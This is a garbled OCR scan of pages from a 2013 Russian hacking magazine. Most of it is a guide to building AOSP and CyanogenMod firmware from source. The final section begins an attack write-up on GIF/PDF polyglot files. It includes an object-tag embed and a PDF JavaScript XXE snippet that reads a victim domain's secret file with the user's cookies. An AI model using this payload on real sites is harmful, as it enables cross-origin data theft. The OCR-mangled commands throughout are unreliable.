стомизации под себя. В этой статье я попытаюсь рассказать об об- 
щих принципах сборки АпбгоісІ на примере чистого А05Р (Апсігоісі 
Ореп Зоигсе Ргоіесі], а также его модификации СуаподепМоб. 



ВВЕДЕНИЕ 



Итак, мы будем собирать Апсігоісі из исходных 
кодов. Условно разделим этот занимательный 
процесс на три шага: 

1. Подготовка системы. 

2. Скачивание исходников. 

3. Собственно сама сборка. 

В процессе мы скомпилируем Апсігоісі 
для четырех разных устройств, включая офи- 
циальный баіаху Иехиз, поддерживаемый ко- 
мандой СуаподепМоб І_6 Оріітиз ВІаск, а также 
Батзипд баіаху У и Моіогоіа беіу, для которых 
существуют только неофициальные порты СМ, 
развиваемые независимыми разработчиками. 



ПРЕДВАРИТЕЛЬНЫЕ ЛАСКИ, 
ИЛИ НАСТРОЙКА СИСТЕМЫ I 



Для начала определимся с тем, что нам по- 
требуется для сборки ДОБР из исходников. 
Во-первых, Ыпих, желательно ІІЬипІи, и, 
если хочешь собрать АпбгоісІ версии 2.3.x 
(ЗіпдегЬгеаб) и выше, ОС должна быть 64-раз- 
рядной. Замечу также, что по заявлению ко- 
манды разработчиков, «беспроблемная» сбор- 
ка сейчас возможна только под СІЬипІи версий 
10.04-11.10, тогда как на 12.04 соберется только 
последняя версия Апсігоісі. Тем не менее я про- 
водил все эксперименты на 12.04 и не встретил 
каких-либо ошибок или некорректной работы 
прошивки. 



Кроме того, нужно позаботиться о до- 
статочном количестве дискового простран- 
ства и оперативной памяти. Сами исходники 
Апсігоісі занимают около 14 Гб. Учитывай 
также, что в процессе сборки испарится еще 
где-то 15 Гб. Оперативной памяти потребует- 
ся не меньше 2 Гб, да и то вкупе с областью 
подкачки, размером 3-4 Гб. Если все эти 
требования удовлетворены, можно приступить 
к подготовке системы. Для начала установим 
необходимые пакеты: 

$ зисіо ар-Ь-ее* іпБІаІІ §і1:-соге епир§ 

Лех Ьізоп §рег-Р ЬиіІб-езБеп-СіаІ гір ♦-< 
сигі ІіЬсб-беѵ ІіЬпсигБезБ-беѵ: І386 
хІІргоТо-соге-беѵ 1іЬх11-беѵ:і386 
1іЬгеаб1іпе6-беѵ:і386 НЬ§11-те5а-§1х:«-« 
І386 1іЬ§11-те5а-беѵ §-м--тиШ.ПЬ «- 1 
тіп§\л/32 орепдбк-6-дбк ТіоГгобоБ руСІіоп-^* 
тагкбоип 1іЬхт12-и1:іІ5 хзИргос ♦-< 
2ІіЬіе-беѵ:і386 

$ зибо 1п -5 /и5г/ИЬ/і386-1іпих-епи/— 
те5а/1іЬСІ_.50.1 /и5г/1іЬ/і386-1іпих-епи/^ 
ІІЬСІ-.БО 

Немного слов о бйК: рекомендует- 
ся использовать Огасіе баѵа ббК, но, так 



048 



ХАКЕР 01 /168/2013 





Лучшее — друг хорошего 



СЬескіпд 


ОІІІ 


Шез 


100% 


(24601/24601), сіопе. 








СЬескіпд 


очі 


Гііез 


100% 


(17771/17771), сіопе.иі 


Гііез: 


0% 


(14/17771) 


СЬескіпд 


оиі 


Гііез 


100% 


(4265/4265), сіопе. 


оиі 


Гііез: 


44% 


(1899/4265) 


СЬескіпд 


оиі 


тез 


100% 


(983/983), сіопе. пд 


оиі 


Гііез: 


1% 


(11/983) 


СЬескіпд 


осіі 


Гііез 


100% 


(376/376), сіопе. пд 


оиі 


Гііез: 


9% 


(37/376) 


СЬескіпд 


оиі 


Шез 


100% 


(431/431), сіопе. пд 


очі 


Гііез: 


18% 


(78/431) 


СЬескіпд 


ОІІІ 


Гііез 


100% 


(175/175), сіопе. 










СЬескіпд 


оиі 


Шез 


100% 


(135/135), сіопе. 










СЬескіпд 


оыі 


Шез 


100% 


(433/433), сіопе. пд 


оиі 


Гііез: 


14% 


(61/433) 


СЬескіпд 


оііі 


Гііез 


100% 


(2407/2407), сіопе. 










СЬескіпд 


ОЦІ 


Гііез 


100% 


(2489/2489), сіопе. 


оиі 


Гііез: 


28% 


(698/2489) 


СЬескіпд 


оиі 


Гііез 


100% 


(2493/2493), сіопе. 










СЬескіпд 


оці 


Гііез 


100% 


(177/177), сіопе. 










СЬескіпд 


оці 


Гііез 


100% 


(137/137), сіопе. пд 


ОІІІ 


Гііез: 


21% 


(29/137) 


СЬескіпд 


оці 


Гііез 


100% 


(110/110), сіопе. 










СЬескіпд 


оці 


Гііез 


100% 


(36618/36618), сіопе. 








СЬескіпд 


оці 


Гііез 


100% 


(20/20), сіопе. кіпд 


ОЦІ 


Гііез: 


25% 


(5/20) 


СЬескіпд 




Гііез 


100% 


(81/81), сіопе. 










СЬескіпд 


ОІІІ 


Гііез 


100% 


(450/450), сіопе. 










СЬескіпд 


оиі 


Гііез 


100% 


(5428/5428), сіопе. 


оиі 


Гііез: 


0% 


(2/5428) 



Бупсіпд могк ігее: 100% (ЗѲ6/ЗѲ6), сіопе. 
готап@готап-5аіеІіи:е-С66Ѳ0:~/апс1гоІс1/5у5іет$ 



Скриншот 1. Успешная загрузка исходников 

как он больше не поставляется в репозито- 
риях ІІЬипІи, его нужно скачать с сайта Огасіе 
и установить самостоятельно ( доо.дІ/М4ІВ2 ). 
Кроме того, нам понадобится гугловский 
инструмент для работы с репозиториями геро, 
представляющий собой РуіЬоп-обертку вокруг 
системы контроля версий діі: 

$ шксііг ~/Ьіп 

$ сигі Ьіір://сІ1.§оо§1есосІе.сот/4-> 
іпзігитепіз/еіі/геро 
$ сЬтосі х+г геро 
$ ехрогі РАТН=$РАТН : ~/Ьіп 

Теперь система готова, и нам нужны ис- 
ходники АпсігоісІ- 



ЗАГРУЗКА ИСХОДНИКОВ 



Перечисленные манипуляции по настройке 
системы справедливы для сборки любой 
версии и любой модификации АпЬгоісі. Даль- 
нейшие наши действия уже зависят от наших 
желаний. Для примера давай начнем со сбор- 
ки А05Р для баіаху Ыехиз. Это типичнейший 
вариант. Для этого создадим каталог (можешь 
назвать его как угодно, это непринципиаль- 
но), в котором собственно и будут лежать 
исходники: 



$ шксііг -р апсігоісі/зузіет 
$ ссі апсігоісі/зузіет 

Далее необходимо инициализировать репо- 
зиторий с помощью геро: 

$ геро іпіі -и Ьіірз://апсІгоісІ.«^ 
§оое1е5оигсе.сот/р1аіТогт/тапіТе5і 

На этом этапе геро попросит ввести имя 
и е-таіі, что делать совсем не обязательно. 

По умолчанию геро будет настроен на ветку 
тазіег указанного репозитория (это последняя 
версия системы). Если тебе нужны исходники 
другой версии, укажи ее с помощью ключа 
'-Ь*. Например: 

$ геро іпіі -и Ьіірз ://апсІгоісІ.«-' 
§оо§1е5оигсе . сот/рІаГТогт/тапі-Резі — 

-Ь апсІгоісІ-4.0.1_г1 

Далее можно приступить к загрузке файлов: 

$ геро зупс 

Чтобы загрузка происходила в несколько 
потоков, можно указать опцию -]#, где # — 
число потоков. Сам процесс загрузки довольно 



АГРЕССИВНЫЕ 

ОПТИМИЗАЦИИ 



Чтобы повысить производительность прошив- 
ки, ты можешь попробовать применить более 
агрессивные опции оптимизации компиля- 
тора. Для этого вместо «тка Ьасоп» запусти 
такую команду: 

$ СПАС5= 1 -ОЗ -ТопйТ-Тгате-роз.п-Сег' «-< 
тка Ьасоп 

Но это на твой страх и риск, так как 
можешь нарушить совместимость сборки с со- 
фтом и железом. 



длительный (на канале шириной 1 Мб загрузка 
заняла больше трех часов), поэтому можешь 
спокойно идти заниматься своими делами. 

В случае если загрузка оборвется, достаточно 
будет вновь выполнить «геро зупс» для ее 
восстановления с прерванного места. После 
окончания загрузки на экран будет выведе- 
на надпись вида «Бупсіпд ѵѵогк Ігее: 100% 
(306/306) сіопе» (см. скриншот 1). Это значит, 
что уже можно приступать к сборке. 



СБОРКА 



Перед тем как начать процесс компиляции, мы 
должны выполнить команды скрипта епѵзеіир. 
зЬ для установки всех необходимых перемен- 
ных окружения и функций. Для этого перехо- 
дим в каталог с исходниками (у меня -ѴапсігоісІ/ 
зузіет) и выполняем: 

$ . ЬиіІсІ/епѵзеіир.зЬ 

Только в случае успешного выполнения этого 
скрипта можно вызывать команду: 

$ ІипсЬ имя_устройства 

Она предназначена для выбора цели сборки 
или, говоря другими словами, конкретного 



Ѳ8 -а <1а1а оиІ/Іагдеі/ргогіисІ/тадиго/изегсІзіаЛтд ои*/*агдеІ/рго<1исІ/ічадиго/<1аіа 
паке_ех14Г* -5 -5 оиІ/ІагдеІ/ргсх1исІ/г>адиго/гооІ/Гие_сопіехі5 -I 14539537408 -а д 
аіа оиІ/ІагдеІ/ргоОисІ/падиго/и*ег<іаІа . іпд оиі/ІагдеГ /ргойисі/падиго/сіаіа 

♦ таке_ех14Т* -5 -5 оиТ/ІагдеІ/рго6исТ/падиго/гооТ/ТіІе_сопТехІ* -I 14539537408 -а 
гіаіа оиІ/ІагдеІ/рго4исІ/тадиго/и*егОаІа . іпд оиі/іагдеі/ргосіисі/ічадиго/сіаіа 

СгеаСіпд Ті1е*у*1еп рагапеСег5: 

5іге: 14539534336 
Віоск 5Іге: 4096 
В1оск5 рвг дгоир: 32768 
Іпогіе* рег дгоир: 8144 
ІпоОе *іге: 256 
Зоигпаі Ыоск*: 32768 
ІаЬеІ: 

Віоск*: 3549691 
Віоск дгоир*: 109 
Ке*егѵе<1 Ыоск дгоир *1ге: 871 
ІаЬеІІпд /сіаіа а* и:оЬіесІ_г:*у*Теп_0аІа_ТІІе:50 
Сгеаіегі те*у*1еіч мІІЬ 10/887696 Іпосіе* апсі 97199/3549691 Ыоск5 

♦ ' [ ' Ѳ -пе 0 ' ] ' 

оиС/1агдеТ/ргос)ис1/падиго/и*егОаТа.1тд пах*1ге=14843957568 Ыоск*іге=4224 ІоІаІ=14 
0856312 ге*егѵе=149939328 

готап@гопап-$аІеІИСе-С66Ѳ0:-/ап<)гоІ(]/5у5Іеп$ 



ОрПпІгІпд ѴоісаОІаІег.арк. . . 

ОрНМіІпд ЕпаІІ.арк... 

Орипігіпд 1)*Ь . арк . . . 

Оріілігіпд МогоРЬолеРоггаІ.арк. . . 

ОрНпІгІпд ТгеЬисЬеІ.арк. . . 

Орііпігіпд 5рагеРагіі . арк . . . 

Орііпігіпд СолІасі*Ргоѵ14вг .арк. . . 

ОрПпігіпд ІприГОеѵІсеі . арк . . . 

Оріікігіпд 0иіск$«агсЬ8ох.арк. . . 

ОрГІМгіпд Саііагуг.арк. . . 

ОріІМгІпд 5Ьаг«4$іогад*Васкир . арк . . . 

ОрПнІіІпд ВІиаіооІЬ . арк . . . 

Орііпігіпд ОомпІоаОРгоѵЮегЦІ.арк. . . 

ОрПМіІпд СаІегѵІагРгоѵІдег . арк . . 

ОрІІМхІпд Ароііо. арк . . . 

Яепоѵіпд ипиапГаО ЫпаПм... 

21рр1пд раскаде. . . 

Відпіпд раскаде... 

С I* ап Іпд цр. . . 

Раскаде сопріеіе: /Ьоле/гопап/ап4го14/суаподеп/оиГ/Гагдеі/рго<1ист/р97Ѳ/сп-1Ѳ-2Ѳ121 
Ѳ27-ІІНОРРІСІАІ. -р97Ѳ. хір 
гопап0гоічап-$а*еіте-С6беО:-$ | 



Скриншот 2. Сборка А05Р завершена 



Скриншот 3. Сборка СМ завершена 



ХАКЕР 01 /168/2013 



049 







Х-МОВИЕ 



устройства. Вызвав ее без параметра, устрой- 
ство можно будет выбрать из списка. В нашем 
случае нужно указать 7иІІ_тадиго-и5егсіеЬид, 
где тадиго — кодовое имя Заіаху ІЧехиз ЗБ М/ 
Н5РА+. После этого можно запустить процесс 
компиляции: 

$ таке -д'4 

Здесь 4 — число потоков компиляции. Это 
значение рекомендуется выбирать между мак- 
симальным и удвоенным максимальным чис- 
лом аппаратно поддерживаемых потоков (для 
процессоров АМР это число равно количеству 
ядер процессора, для Іпіеі это число нужно 
умножить на два), с учетом того что на каждый 
поток уйдет как минимум 2 Гб оперативки, 
которая, кстати говоря, может закончиться 
в самый неподходящий момент. 

Лично у меня процесс рухнул на сборке биб- 
лиотеки ІіЬѵѵеЬсоге.во из-за нехватки памяти. 
После увеличения свопа с 2 до 3 Гб результат 
был тем же. Пришлось собирать этот модуль 
отдельно и в один поток: таке ІіЬѵѵеЬсоге -]1, 
после чего вновь начинать общую сборку. Воз- 
можны и другие ошибки, но, как правило, они 
уже изучены, и решение можно найти в Гугле. 
При успешной компиляции последняя строка 
вывода будет содержать путь и размер образа 
(скриншот 2). 

На этом сборка А05Р закончена. Но что, 
если нам нужна прошивка для другого аппара- 
та? Так вот, чистый ДОБР ты сможешь собрать 
только под «гугловские» аппараты плюс Бопу 




Скриншот4. СМЮна йеГу 



Хрегіа 5. Конечно, есть решения и для дру- 
гих девайсов, но для таких устройств лучше 
и легче всего собрать модификацию А05Р — 
СуаподепМосі. 



СУАИОбЕММСЮ 



СуаподепМосі (далее СМ) — это форк ДОБР 
со множеством модификаций, направленных 
на улучшение производительности и стабиль- 
ности, массой дополнительных функций и по- 
лезных плюшек, которых нет в стандартной 
прошивке. Разработка СуаподепМосі ведется 
почти под все самые популярные аппараты 
(список здесь: ѵѵѵѵѵѵ.сѵаподептосі.сот/сіеѵісеБ ). 
а это значит, что каждый может собрать 
СуаподепМосі под конкретное устройство 
из исходных кодов, которые всегда доступны 
для скачивания. СуаподепМосі пользуется 
огромной популярностью, поэтому неофи- 
циальные порты прошивки можно найти 
и для множества других аппаратов, помимо 
официально поддерживаемых. 

Существует несколько поддерживаемых 
версий СМ, включая СуаподепМосі 7 (на базе 
ЗіпдегЬгеасі, для маломощных бюджетных 
устройств), СМ9 (на базе ІС5) и до сих пор 
разрабатываемая СМ10 (на базе ЭВ). Сборка 
каждой из версий СМ происходит одинаково. 
Для примера мы скомпилируем СМ10 для 1.6 
Оріітиз ВІаск, но я постараюсь упомянуть обо 
всех отличиях и для других версий СМ. 

Стоит заметить, что компиляция СМ ничем 
не отличается от ДОБР, поэтому действия 
по подготовке системы будут теми же, плюс 
потребуется АйВ, который можно скачать от- 
дельно или в комплекте Апсігоісі БйК. Процесс 
получения исходников аналогичен, за исклю- 
чением адреса: 

$ тксііг апйгоісі/ст 
$ ссі апсігоісі/ст 

$ геро іпі* -и еі* ://§і 1 :ІіиЬ.сот/^ 
Суапо§епМосІ/апсІгоісІ -Ь зеІІуЬеап 
$ геро зупс -38 

Если тебе нужны исходники другой версии, 
то просто укажи ее имя после ключа *-Ь’: «-Ь 
діпдегЬгеасі» для СМ7, «-Ь ісз» для СМ9. Ждать 
придется не меньше, чем при скачивании 
ДОБР, так что можешь спокойно заниматься 
своими делами. По умолчанию загрузятся 
только сорцы самого СМ без специфических 
для конкретных устройств файлов, которые 
можно получить с помощью другой команды: 

$ . Ьиі 1 сІ/епѵ 5 е 1 :ир. 5 Ь && Ьгеак-Раз* р970 

Здесь р970 — кодовое имя 1_6 ОрІітиБ 
ВІаск (как его узнать? Как вариант, можно 
посмотреть на сіоѵѵпіоасі.сѵаподептосі.сот 

слева в колонке Оеѵісез). Кроме исходников 
устройства, также в большинстве случаев 
понадобятся проприетарные библиотеки, 
исходников которых нет (поставщик железа 
их не предоставил). Поэтому их придется 
извлечь с устройства. Для этого с помощью 
ІІБВ-кабеля (тут-то нам и нужен АйВ) под- 



ключаем к компьютеру наш девайс, на кото- 
ром уже должна быть установлена последняя 
официальная версия СМ, и запускаем скрипт 
ехІгасМіІез.зН: 

$ ссі ~/апс!гоісІ/ст/сІеѵісе/1ее/р97Ѳ/ 

$ ./ехТгасС-йІез.БЬ 

Также нам потребуются закрытые приложе- 
ния ВотМападег и ТегтіпаІ Епгшіаіог, которые 
можно получить так: 

$ ~/апсігоі(і/ст/ѵеп(іог/ст/§еТ-ргеЬиі 1 Т 5 

А вот теперь все! Можно собирать: 

$ . ЬиіІсІ/епѵзеТир. бИ && ЬгипсЬ р970 

Здесь ЬгипсЬ — один из хуков, создавае- 
мых епѵзеІир.БЬ. Пока идет процесс сборки, мы 
попробуем разобраться, что же такое ЬгипсЬ, 
а также в других хитрых функциях, использу- 
емых в СМ. 



УСКОРЕНИЕ СБОРКИ 



Если ты соберешь и ДОБР, и СМ, то обязатель- 
но заметишь, что СМ компилируется значи- 
тельно быстрее. И ты наверняка заметил, 
что при сборке А05Р использовалась команда 
таке, а тут — ЬгипсЬ. Если разобраться, 
команда ЬгипсЬ имя_устройства является 
эквивалентом такой команды: 

$ Ьгеак-РаБТ: имя_устройства && тка Ьасоп 

Что же тогда такое «тка Ьасоп»? А в этой 
команде и спрятана вся соль. Это функция, со- 
держащая следующую команду: 

5 сЬесИ:оо 1 -В -п 1 -е іопісе -п 1 4 -. 
таке -] ЧаТ /ргос/сриіп-Ро | «-> 

§гер " л ргосе550г И | мс - 1 ' 

Она переключает планировщик процессора 
в режим 5СНЕ0_ВАТСН и повышает приоритет 
текущей задачи, так что ей отдается больше 
времени на исполнение, а также устанавли- 
вает максимальный приоритет на ввод-вывод 
для текущей задачи и запускает таке, рас- 
параллеливая его на все процессоры. За счет 
этого сборка СМ проходит быстрее, но при этом 
пользоваться компом во время сборки стано- 
вится нереально. 

Если ты планируешь часто пересобирать 
прошивку, то есть смысл настроить ссасЬе, 
чтобы ускорить процедуры пересборки. 

Для этого установи одноименный пакет и до- 
бавь в -/.ЬазЬгс такие строки: 

ехрогТ ІІ5Е_ССАСНЕ=1 

ехрог* ССАСНЕ_ОІК=каталог _для_кеша 

И сразу же после загрузки исходного кода 
выполни: 

$ ргеЬиіІТБ/тіБс/Ііпих-хвб/ссасЬе/^ 
ссасЬе -М 50С 



050 



ХАКЕР 01 /168/2013 







Лучшее — друг хорошего 




Скриншот 5. Главное меню С\Л/М 



или для ІСБ и версий постарше: 

$ ргеЬиіШ1іпих-х86/ссасЬе/ссасЬе -М 506 

Значение 506 здесь для примера. Ты можешь 
указать произвольный размер кеша. 

Теперь вернемся к нашей сборке. В слу- 
чае ее удачного завершения (см. скриншот 3) 
в каталоге ~/апсігоігі/ст/оиіЛагдеі/ргосіисі/ 
р960/ будет лежать файл с названием вроде 
ст-10-ХХХХХХХХХ-ІІІ\ІОРРІСІАІ_-р970.2Ір. Это 
и есть наша прошивка, которую можно уста- 
новить с помощью консоли восстановления 
(гесоѵегу). 



СБОРКА СУАМ06ЕЫМ00 НН 
ДЛЯ КАСТОМНОГО УСТРОЙСТВА 



Не беда, если твоего девайса нет среди офи- 
циально поддерживаемых. Как я уже гово- 
рил, ребята с ХОА или 4РОА часто портируют 
СуаподепМосІ под свои устройства, поэтому 
неофициальный порт СМ можно найти прак- 
тически для любого устройства. Все исходные 
тексты и конфигурационные файлы для де- 
вайса носят имя «дерево устройства» (сіеѵісе 
Ігее) и должны лежать в каталоге «беѵісе/про- 
изводитель/имя_устройства» исходников СМ. 
Для того чтобы собрать СуаподепМосІ под свое 
устройство, ты должен найти в Сети (в боль- 
шинстве случаев находится на бііНиЬ) дерево 
устройства и поместить его в соответствующий 
каталог. 

Для примера возьмем Батзипд ОаІахуУ, 
для которого нет официального СМ. Но 
на бііНиЬ пользователя ѵіѵеккаіасіу І доо. 
д 1 / 50 І 4 І ) я нашел дерево устройства этого 
аппарата для СМ7. Каковы должны быть мои 
действия? В первую очередь я должен скачать 
содержимое репозитория в каталог «сіеѵісе/ 
затзипдДоІого» (іоіого — кодовое имя баіаху 
У], а затем запустить процесс компиляции. 

Но где брать проприетарные файлы? Их можно 
извлекать только с девайса с рабочим офици- 
альным СМ, что невозможно в нашем случае. 
Часто эти файлы уже есть в дереве устройства, 




Скриншот 6. Выбор архива для прошивки 



но я их там не нашел, зато нашел в другом 
репозитории на біЖиЬ того же ѵіѵеккаіасіу 
І доо.дІ/5.ІѵІд ). Далее остается скопировать их 
в каталог «ѵепсіог/затзипдЛоІого», получить 
ВотМападег и ТегтіпаІ Етиіаіог, как показано 
выше, и начать сборку: 

$ . ЬиіІсІ/епѵБеТир.зЬ && ЬгипсЬ ТоТого 

Другие авторы портов могут выложить 
в Сеть все исходники СМ вместо отдельно- 
го дерева устройства. Например, порт СМ10 
для Моіогоіа Реіу (официально для нее 
поддерживается только СМ9) лежит вместе 
с исходниками СМ10 в біЖиЬ пользователя 



с ником йиагх с 4рсІа.ги. Для сборки этого 
порта делаем следующее: 

$ геро іпі* -и §і1:://§іТІіиЬ.сот/-- 
(2иагх2к/апсІгоісІ.§іТ -Ь деІІуЬеап 
$ геро зупс 

Проприетарные файлы уже находятся 
в исходниках, так что искать или извлекать 
их не требуется. Все, что останется сделать, — 
просто скачать «несобираемое» ПО и запу- 
стить процесс сборки: 

$ ~/апсігоісІ/5у5Тет/ѵепсіог/ст/§еІ-ргеЬиі1'С5 
$ . ЬиіІсІ/епѵзеТир. зЬ && ЬгипсЬ тЬ525 

Кстати, по причине залоченного загруз- 
чика кастомные прошивки для йеіу работают 
на ядре, загружаемом на лету с помощью 
модуля кехес. Это ядро носит эксперименталь- 
ный статус, и тебе придется прошивать его 
отдельно уже после установки самой прошив- 
ки (смотри файл 2псіЬооІ_06.10.2Ір на нашем 
диске). 



ВМЕСТО ИТОГОВ 



Если тебе не удалось собрать Апсігоісі с первого 
раза — не нужно расстраиваться. Наберись 
терпения и продолжай. Свою первую прошивку 
я собрал через неделю после первой попытки. 
Я постарался описать основные принципы 
сборки Апсігоісі из исходных кодов, но боль- 
шое количество важной информации все же 
осталось за кадром. В сносках я оставил не- 
сколько ссылок, по которым есть дополнитель- 
ная информация. На этом у меня все. Удачной 
сборки! ІЕ 



УСТАНОВКА СѴАЫ06ЕММСЮ 
ЧЕРЕЗ СѴѴМ 



Установку кастомных прошивок следует выполнять 
из СІоскѵѵогкМосі Весоѵегу (СѴѴМ). Это кастомная кон- 
соль восстановления, позволяющая устанавливать про- 
шивки с любыми цифровыми подписями. Мануал о том, 
как установить СММ на твой конкретный девайс, ищи 
на х(іа-с!еѵ или просто погугли. Я опишу лишь установку 
СуаподепМосІ с его помощью. 

Для начала выключи телефон и включи его с за- 
жатыми кнопками <Роѵѵег> + <ѴоІите 1)р> + <Ноте> 
(комбинация может отличаться для разных устройств). 
После этого ты увидишь меню, показанное на скрин- 
шоте 5. Для навигации используй клавиши громкости, 
для выбора выделенного пункта — клавишу <Ноте> 
(или <Роѵѵег>). Для начала выполни сброс до заводских 
настроек с помощью пункта ѵѵіре сіаіа / Іасіогу гезеі, а 
затем смонтируй карту памяти с помощью меню тоипіз 
апсі зіогаде — ► тоипі 115В зіогаде и скопируй на нее 
файл прошивки. Далее выбери пункт «іпзіаіі гір Ігот 
зсісагсі» и выбери файл с прошивкой (скриншот 6). Гото- 
во! СуаподепМосІ установлен. 



ІШП 

• Существуют 
автоматизирован- 
ные системы сборки 
Апсігоісі с исходных 
КОДОВ: доо.дІ/ІОрѵт 
и дор.д!/ууаі_М. 

• Проприетарные 
файлы можно также 
извлечь из архива 
прошивки, а нес ра- 
бочего девайса. 

Это можно сделать 

с помощью скрипта 
ипгір-іііев. внесли 
таковой имеется 
в дереве устройства. 

• В сборку СМ 
не включены 
стандартные при- 
ложения отОоодІе 
Ідаррв). Для их 
установки скачай 
отсюда доо.іт/даррв 
архив и установи 
через С^М. 



гта 

• На диске лежит 
собранная прошивка 
СМІОдля Моіогоіа 
Реіу, а также загруз- 
чик кастомного ядра 
для Моіогоіа Реіу. 

І'ШѴі 

• Официальная стра- 
ница проекта А05Р: 

ооо.д |/)ЦуСг; 

• ѵѵікі-статья о сбор- 
ке СуаподепМосІ: доо. 
ді/ѵіисх; 

• сборка Апсігоісі под 
Х86: доо.дІ/ХГЕао; 

•здесь можно по- 
читать подробнее 
о дереве устройства: 

доо.дІ/ 79РгУ+: 

• подробнее 
оЬгеакіазі, ІипсЬ 
и ЬгипсН: доо.ді/ 

кХ620. 



ХАКЕР 01 /168/2013 



051 









ВЗЛ0М/ЕА5УНАСК 



Алексей «ОгеепОод» Тюрин, Оідііаі Зесигііу (Іѵѵіііег.сот/апіуигіп) 





І'ЛМШМ 

Вся информация 
предоставлена исклю- 
чительно в ознакоми- 
тельных целях. 

Ни редакция, ни автор 
не несут ответствен- 
ности за любой воз- 
можный вред, причи- 
ненный материалами 
данной статьи. 



ГИД 

Все описанные про- 
граммы со всей рубри- 
ки ищи на диске. 



СПРЯТАТЬ РОР В 6ІР 



ЗАДАЧА 



РЕШЕНИЕ 

Сегодняшний Базу Наск во многом посвящен всяким странным 
или специфическим штукам, нестандартному использованию 
стандартных вещей. Но это-то и круто! Ведь именно так и появля- 
ются новые векторы атак. Как говорят знающие люди, здесь важно 
упорство и воображение, и тогда даже из всем известных штук 
можно вырастить что-то новое, интересное, мощное... В общем, 
я под большим впечатлением от 2егоІМідНі$ 2012 :). 

Но давай вернемся к задаче. Во-первых, зачем это нужно? 

Для того, чтобы мы могли загрузить РЭР'ку там, где мы их не можем 
загружать. Ведь очень часто бывает, что загрузка всевозможных 
картинок разрешена — они по определению считаются достаточ- 
но безопасными. Хорошо, скажешь ты, а зачем это-то нужно? Нам 
как атакующим от картинок маловато профита, а вот РОР имеет 
в себе приличный пучок возможностей. Если не говорить о том, 
что один из основных путей заражения компов всякой вирусней — 
это РРР и обрабатывающий их АсгоЬаІ Реагіег, то можно вспомнить, 
что мы можем проводить БОРР-атаки или получить ХББ'ку на сер- 
вере через РйР. Если что — примеры увидишь чуть позже. 

Как же решить задачку? Все оказывается проще, чем представ- 
ляется, если почитать и посмотреть где надо, а именно в стан- 
дартах. В них пишется, что заголовок РйР (типа %РОР-1.1) должен 
находиться в первых 1024 байтах файла. Что будет идти до заголов- 
ка, АсгоЬаІ Реасіег'у абсолютно все равно. Этим-то мы и можем вос- 
пользоваться, разместив в начале файла данные в одном формате 
(например, СІР, ЭРО, йос), а дальше после 1024 байта — в другом, 
то есть в РйР (см. пример на рис. 1). При этом оба формата остаются 
валидными. Все зависит от того, как мы обращаемся к файлу 



(который, предположим, загрузили на Ьир://рсМх 55 .арр 5 ро 1 .сот/ 

Боп-оГ-біЫМоіАРОР.діЯ: 

1. Браузер распознает данные как 6ІР и отобразит их рисунком: 

< іте 5р.с«"И«р : //рй-Рхзз . аррзроі: . сот/Боп-о-Р-Сі-Раг/^ 
Мо^АРОР.^і-р" Ьеі§ІгС=1Ѳ місІ1:Ь*10></іт§> 

2. Браузер распознает данные как РРР и запустит плагин АсгоЬа* 
Реасіег: 

собесе сІа'Еа= <І ІгНр : //рсІ-Рхзз . аррзро* . сот/*-* 
5оп-о-Р-бі-Раг/Мо*АР0Р.§і-Р" 1:уре= и арр1іса-1:іоп/рсІ-Р" «-« 
міаіИ="Б00 и Неі§НІ="500"></оЬзес1:> 

С задачей мы справились. Еще раз подтвержу, что вместо 
ОІР’а мы можем подставить практически любой другой формат. 




Рис. 1. Один файл на двоих. Сначала — 6ІР, потом — РРР 



052 



ХАКЕР 01 /168/2013 




Хакерские секреты простых вещей 



И при этом мы сможем обходить многие проверки загружаемых 
данных, так как расширение у нас будет верное, да и сам файл 
в начале правильного формата. Далее — профит и обещанные 
примерчики. 

На первый взгляд, мы упираемся в препятствие — необходи- 
мость указать обработчик на сайте жертвы. То есть, чтобы РйР 
заработал как РйР, нам нужно точно указать тег о^есі, а для этого 
надо иметь возможность вставлять НТМІ_-код на сайт жертвы. 

А раз так, то какой тогда смысл, если мы уже имеем возможность 
для Х55? 

На самом деле крутость РОР в данном случае в том, что вне 
зависимости от того, с какого домена мы его подгружаем (то есть 
где написан тег оЬіесі], РОР фактически относится к тому домену, 
на котором он хостится (то есть куда указывает атрибут сіаіа тега 
оЬіесі). Таким образом, получается, что мы вешаем у себя странич- 
ку с вызовом в оЬ]есІ РОР'ки с атакуемого нами сервера, и, когда 
мы заманим на страничку нашу жертву, его браузер обработает ее 
как РОР и запустит плагин АсгоЬаІ Реасіег'а, со всеми вытекающи- 
ми отсюда последствиями. 

Последствия. Как мы видим, здесь с точки зрения АсгоЬаІ 
Реабег'а нет нарушения Бате Огідіп Роіісу, а потому мы можем 
выполнять произвольные запросы (на тот домен, где хостится РОР), 
и при этом необходимые куки будут автоматом добавляться браузе- 
ром, получать ответы и обрабатывать их с помощью ЗаѵаБсгірІ'а, 
встроенного в РОР. По сути, мы имеем почти стандартную храни- 
мую ХББ'ку в виде РОР-файла. 

Ну и небольшой пример, как можно инициализировать эти за- 
просы (кусок РОР'ки): 

>>5І:геат 

ѵаг хт1="<?хт1 ѵег5Іоп=\"1.0\" епсосИ.п§=\"150-8859-1\"?> 

< ! ЭОСТУРЕ -Роо [ 

< ! ЕЬЕМЕМТ Роо АМѴ> < ! ЕМТІТѴ ххе 5Ѵ5ТЕМ Ѵ'ЬХХр://^ 
рсІ-Рх55 . аррзроі: . сот/зесгеі . *х*\" >] > 

<-Роо>&ххе;</-Роо>" ; 

ѵаг хсіос = ХМЮаТа.раг5е(хт1 л -РаІ5е) ; 
арр.а1ег*(е5саре(хсІос.-Роо.ѵа1ие)) ; 
епсІзТгеат 

Просто угар! Мы можем обозначить свою ХМІ_ с ОЮ и ХХЕ 
со ссылкой на интересующую страницу хоста, заставить отпар- 
сить ее и получить ответ. О ужас — ХХЕ везде :). Стоит отметить, 
что здесь мы не юзаем какие-то уязвимости АсгоЬаІ Реасіег'а, это 
просто его фича, и исправлять ее АсіоЬе в ближайшее время не со- 
бирается! 

На рис. 3 представлен пример всей атаки. Здесь хз-зпірег. 
сот — домен атакующего, куда заманивается пользователь-жерт- 
ва, а рсКх55.арр5ро1.сот — сервера-жертвы с залитым на него фай- 
лом 6ІР-РОР-мутантом — ХМІ_.діР. РОР'ка делает запрос на Мір:// 
рс1(х55.арр5ро1.сот/5есгеихІ с необходимыми куками (азсіазсіазсі) 
и получает хранящиеся в нем данные. 

Теперь о минусах. У СЬготе используется своя, встроенная 
версия РЭР-ридера, которая уже пропатчена. Вторая проблема — 
с ІЕ. По умолчанию РОР'ки полностью скачиваются с сайта и факти- 



чески запускаются уже локально (из папки «Тетр»). То есть Х55 мы 
